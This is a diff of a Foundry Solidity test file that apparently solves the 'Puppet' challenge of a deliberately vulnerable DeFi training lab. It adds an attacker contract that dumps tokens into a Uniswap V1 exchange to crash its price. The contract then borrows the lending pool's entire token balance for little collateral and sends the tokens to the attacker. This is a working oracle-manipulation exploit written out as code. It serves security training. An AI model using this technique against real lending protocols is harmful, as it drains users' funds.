@@ -101,6 +101,15 @@ contract Puppet is Test {
          * EXPLOIT START *
          */
 
+        //uint256 tt = UniswapV1Exchange(uniswapExchange).getTokenToEthInputPrice(10 ether);
+        //console2.log("getTokenToEthInputPrice", tt);
+        vm.startPrank(attacker);
+        PuppetAttacker puppetAttacker =
+            new PuppetAttacker{value: 25 ether}(address(uniswapExchange), address(dvt), address(puppetPool));
+        DamnValuableToken(dvt).transfer(address(puppetAttacker), ATTACKER_INITIAL_TOKEN_BALANCE);
+        puppetAttacker.attack();
+        vm.stopPrank();
+
         /**
          * EXPLOIT END *
          */
@@ -124,4 +133,27 @@ contract Puppet is Test {
         uint256 denominator = (input_reserve * 1000) + input_amount_with_fee;
         return numerator / denominator;
     }
+}
+
+contract PuppetAttacker {
+    address uniswapExchange;
+    address dvt;
+    address puppetPool;
+    address attacker;
+
+    constructor(address uniswapExchange_, address dvt_, address puppetPool_) payable {
+        uniswapExchange = uniswapExchange_;
+        dvt = dvt_;
+        puppetPool = puppetPool_;
+        attacker = msg.sender;
+    }
+
+    function attack() external payable {
+        DamnValuableToken(dvt).approve(uniswapExchange, type(uint256).max);
+        UniswapV1Exchange(uniswapExchange).tokenToEthSwapInput(1000 ether, 1, block.timestamp + 100);
+        PuppetPool(puppetPool).borrow{value: 20 ether}(DamnValuableToken(dvt).balanceOf(address(puppetPool)));
+        DamnValuableToken(dvt).transfer(attacker, DamnValuableToken(dvt).balanceOf(address(this)));
+    }
+
+    receive() external payable {}
 }
